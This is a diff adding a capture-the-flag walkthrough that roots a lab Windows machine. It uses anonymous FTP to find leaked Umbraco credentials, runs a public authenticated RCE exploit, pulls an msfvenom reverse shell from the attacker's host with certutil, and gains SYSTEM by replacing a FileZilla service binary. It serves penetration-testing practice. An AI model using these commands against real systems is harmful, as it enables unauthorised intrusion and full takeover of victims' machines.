@@ -110,3 +110,404 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 68.83 seconds
 ```
+
+# 2. Checking the ftp anonymous login
+
+Use `lftp` and `find` to get list of everything in the ftp server
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ lftp -u anonymous:anonymous 10.0.88.45
+lftp anonymous@10.0.88.45:~>find
+./
+./AccountPictures/
+./AccountPictures/desktop.ini
+./Desktop/
+./Desktop/Google Chrome.lnk
+./Desktop/desktop.ini
+./Documents/
+./Documents/My Music/
+./Documents/My Pictures/
+./Documents/My Videos/
+./Documents/desktop.ini
+./Downloads/
+./Downloads/desktop.ini
+./FTP/
+./FTP/CMS.bk.zip
+./FTP/pass.txt.txt
+./Libraries/
+./Libraries/RecordedTV.library-ms
+./Libraries/desktop.ini
+./Music/
+./Music/desktop.ini
+./Pictures/
+./Pictures/desktop.ini
+./Videos/
+./Videos/desktop.ini
+./desktop.ini
+```
+
+The `pass.txt.txt` looks interesting, let retrieve it
+
+```console
+lftp anonymous@10.0.88.45:/> get ./FTP/pass.txt.txt
+79 bytes transferred
+```
+
+Indeed it contains credentials, but to where?
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ cat pass.txt.txt
+Install Notes, Do not forget
+username: admin@itsl.local
+password: mouseindeed
+```
+
+# 3. Targeting the Umbraco CMS
+
+Recall that it appears to have 2 http endpoints from the nmap output:
+
+```console
+80/tcp    open  http          Microsoft IIS httpd 10.0
+9450/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+```
+
+- Browsing to `:80` presents just a default Microsoft IIS page
+- Browsing to `:9450` presents the Umbraco CMS
+  - Logging in to Umbraco shows that it's version `7.12.4`
+
+Search for Umbraco exploits:
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ searchsploit umbraco
+-------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                |  Path
+-------------------------------------------------------------- ---------------------------------
+Umbraco CMS - Remote Command Execution (Metasploit)           | windows/webapps/19671.rb
+Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution    | aspx/webapps/46153.py
+Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)    | aspx/webapps/49488.py
+Umbraco CMS 8.9.1 - Directory Traversal                       | aspx/webapps/50241.py
+Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting    | php/webapps/44988.txt
+Umbraco v8.14.1 - 'baseUrl' SSRF                              | aspx/webapps/50462.txt
+-------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+2 exploits found for Umbraco, let's try `aspx/webapps/49488.py`:
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ searchsploit -m 49488
+  Exploit: Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)
+      URL: https://www.exploit-db.com/exploits/49488
+     Path: /usr/share/exploitdb/exploits/aspx/webapps/49488.py
+File Type: Python script, ASCII text executable, with very long lines (723)
+
+Copied to: /home/kali/49488.py
+```
+
+Let's test the exploit
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ python 49488.py
+usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]
+exploit.py: error: the following arguments are required: -u/--user, -p/--password, -i/--host, -c/--command
+
+┌──(kali㉿kali)-[~]
+└─$ python 49488.py -u admin@itsl.local -p mouseindeed -i http://10.0.88.45:9450 -c whoami -a /all
+
+USER INFORMATION
+----------------
+
+User Name                   SID
+=========================== ==============================================================
+iis apppool\myumbraco.local S-1-5-82-2867232655-821789080-2605998483-2372908944-1093970894
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes
+==================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level Label            S-1-16-12288
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+```
+Well done, we got RCE from the IIS AppPool user `myumbraco.local`, let's try to get a shell
+
+# 4. Getting a shell
+
+Generate reverse shell executable and setup web server endpoint on Kali:
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: reverse.exe
+
+┌──(kali㉿kali)-[~]
+└─$ sudo python3 -m http.server 80 &> /dev/null &
+[1] 2111
+```
+
+Open another console window on Kali to listen for connections:
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+Download the reverse shell executable using the Umbraco RCE:
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ python 49488.py -u admin@itsl.local -p mouseindeed -i http://10.0.88.45:9450 -c certutil.exe -a '/urlcache /f /split http://kali.vx/reverse.exe C:\\Users\\myumbraco.local\\reverse.exe'
+****  Online  ****
+  0000  ...
+  1c00
+CertUtil: -URLCache command completed successfully.
+```
+
+Verify file saved successfully:
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ python 49488.py -u admin@itsl.local -p mouseindeed -i http://10.0.88.45:9450 -c cmd -a '/c dir C:\\Users\\myumbraco.local\\'
+ Volume in drive C has no label.
+ Volume Serial Number is DA18-B95C
+
+ Directory of C:\Users\myumbraco.local
+
+11/26/2022  04:01 AM    <DIR>          .
+11/26/2022  04:01 AM    <DIR>          ..
+07/16/2016  03:47 AM    <DIR>          Desktop
+10/12/2021  08:06 PM    <DIR>          Documents
+07/16/2016  03:47 AM    <DIR>          Downloads
+07/16/2016  03:47 AM    <DIR>          Favorites
+07/16/2016  03:47 AM    <DIR>          Links
+07/16/2016  03:47 AM    <DIR>          Music
+07/16/2016  03:47 AM    <DIR>          Pictures
+11/26/2022  04:01 AM             7,168 reverse.exe
+07/16/2016  03:47 AM    <DIR>          Saved Games
+07/16/2016  03:47 AM    <DIR>          Videos
+               1 File(s)          7,168 bytes
+              11 Dir(s)  40,163,545,088 bytes free
+```
+
+Execute the reverse shell executable:
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ python 49488.py -u admin@itsl.local -p mouseindeed -i http://10.0.88.45:9450 -c cmd -a '/c C:\\Users\\myumbraco.local\\reverse.exe'
+```
+
+Verify that the reverse shell has hooked on from the listener console
+```console
+connect to [192.168.17.10] from (UNKNOWN) [10.0.88.45] 49756
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\myumbraco.local
+```
+
+Excellent, now we have shell on the target
+
+# 5. Privilege Escalation
+
+Scan for possible points of privilege escalation using [PrivescCheck](https://github.com/itm4n/PrivescCheck)
+
+```console
+c:\windows\system32\inetsrv>certutil.exe -urlcache -f -split https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 C:\Users\myumbraco.local\PrivescCheck.ps1
+certutil.exe -urlcache -f -split https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 C:\Users\myumbraco.local\PrivescCheck.ps1
+****  Online  ****
+  000000  ...
+  01444c
+CertUtil: -URLCache command completed successfully.
+
+c:\windows\system32\inetsrv>powershell -nop -ep bypass -c "Import-Module C:\Users\myumbraco.local\PrivescCheck.ps1; Invoke-PrivescCheck"
+powershell -nop -ep bypass -c "Import-Module C:\Users\myumbraco.local\PrivescCheck.ps1; Invoke-PrivescCheck"
+⋮
+
++------+------------------------------------------------+------+
+| TEST | SERVICES > Non-default Services                | INFO |
++------+------------------------------------------------+------+
+| DESC | List all registered services and filter out the ones  |
+|      | that are built into Windows. It does so by parsing    |
+|      | the target executable's metadata.                     |
++------+-------------------------------------------------------+
+[*] Found 5 result(s).
+
+
+Name        : FileZilla Server
+DisplayName : FileZillaServer
+ImagePath   : "C:\xampp\filezillaftp\filezillaserver.exe"
+User        : LocalSystem
+StartMode   : Automatic
+
+Name        : FreeSWITCH
+DisplayName : FreeSWITCH Multi Protocol Switch
+ImagePath   : "C:\Program Files\FreeSWITCH\FreeSwitchConsole.exe"  -service
+User        : LocalSystem
+StartMode   : Automatic
+
+Name        : GoogleChromeElevationService
+DisplayName : Google Chrome Elevation Service (GoogleChromeElevationService)
+ImagePath   : "C:\Program Files\Google\Chrome\Application\107.0.5304.108\elevation_service.exe"
+User        : LocalSystem
+StartMode   : Manual
+
+Name        : gupdate
+DisplayName : Google Update Service (gupdate)
+ImagePath   : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
+User        : LocalSystem
+StartMode   : Automatic
+
+Name        : gupdatem
+DisplayName : Google Update Service (gupdatem)
+ImagePath   : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /medsvc
+User        : LocalSystem
+StartMode   : Manual
+⋮
+
++------+------------------------------------------------+------+
+| TEST | SERVICES > Binary Permissions                  | VULN |
++------+------------------------------------------------+------+
+| DESC | List all services and check whether the current user  |
+|      | can modify the target executable or write files in    |
+|      | its parent folder.                                    |
++------+-------------------------------------------------------+
+[*] Found 2 result(s).
+
+
+Name              : FileZilla Server
+ImagePath         : "C:\xampp\filezillaftp\filezillaserver.exe"
+User              : LocalSystem
+ModifiablePath    : C:\xampp\filezillaftp
+IdentityReference : NT AUTHORITY\Authenticated Users
+Permissions       : Delete, WriteAttributes, Synchronize, ReadControl, ListDirectory, AddSubdirectory,
+                    WriteExtendedAttributes, ReadAttributes, AddFile, ReadExtendedAttributes, Traverse
+Status            : Running
+UserCanStart      : False
+UserCanStop       : False
+
+Name              : FileZilla Server
+ImagePath         : "C:\xampp\filezillaftp\filezillaserver.exe"
+User              : LocalSystem
+ModifiablePath    : C:\xampp\filezillaftp\filezillaserver.exe
+IdentityReference : NT AUTHORITY\Authenticated Users
+Permissions       : Delete, WriteAttributes, Synchronize, ReadControl, ReadData, AppendData, WriteExtendedAttributes,
+                    ReadAttributes, WriteData, ReadExtendedAttributes, Execute
+Status            : Running
+UserCanStart      : False
+UserCanStop       : False
+⋮
+```
+
+- It appears FileZilla is running as `LocalSystem` and the application binaries can be overwritten by `NT AUTHORITY\Authenticated Users`
+- However, we do not have rights to restart the service, so we need to reboot the target for changes to take effect
+
+Replace the application binaries with the reverse shell executable we generated previously:
+
+```console
+c:\windows\system32\inetsrv>move C:\xampp\filezillaftp\filezillaserver.exe C:\xampp\filezillaftp\filezillaserver.exe.bak
+move C:\xampp\filezillaftp\filezillaserver.exe C:\xampp\filezillaftp\filezillaserver.exe.bak
+        1 file(s) moved.
+
+c:\windows\system32\inetsrv>copy C:\Users\myumbraco.local\reverse.exe C:\xampp\filezillaftp\filezillaserver.exe
+copy C:\Users\myumbraco.local\reverse.exe C:\xampp\filezillaftp\filezillaserver.exe
+        1 file(s) copied.
+```
+
+Reboot the target machine, and quickly re-open the netcat listener
+- Run reboot: `shutdown -r -t 0`
+- The reverse shell does not automatically terminate on reboot, so we need to `Ctrl+C` to end the current session
+- Run the listener again with `nc -nlvp 4444` **before the target machine comes back up**
+
+If done correctly, you should see:
+
+```console
+c:\windows\system32\inetsrv>shutdown -r -t 0
+shutdown -r -t 0
+
+c:\windows\system32\inetsrv>^C
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.17.10] from (UNKNOWN) [10.0.88.45] 49669
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+Perfect, we now have a SYSTEM-level shell
+
+Now all that's left is to search and retrieve the flag:
+
+```console
+C:\Windows\System32>dir C:\*flag* /s
+dir C:\*flag* /s
+⋮
+ Directory of C:\Users\Mickey\AppData\Roaming\Microsoft\Windows\Recent
+
+10/14/2021  11:01 AM               554 flag.txt.lnk
+               1 File(s)            554 bytes
+
+ Directory of C:\Users\Mickey\Desktop
+
+10/14/2021  11:02 AM               420 flag.txt.txt
+               1 File(s)            420 bytes
+⋮
+C:\Windows\System32>type C:\Users\Mickey\Desktop\flag.txt.txt
+type C:\Users\Mickey\Desktop\flag.txt.txt
+What we have learned:
+1) ALWAYS check ftp with anonymous
+2)check every running ports, BANNERS, BANNERS can have good info!
+3)Look for public exploits
+4)Know how to read public exploits
+5) If one way fails, try another way
+6)ENUMERATE ENUMERATE AND NEVER GIVE UP
+7) check for common privesc ways
+
+CONGRATS ON ROOTING THE BOX
+
+Try the next one from ITSL
+https://www.youtube.com/channel/UCXPdZsu8g1nKerd-o5A75vA
+```
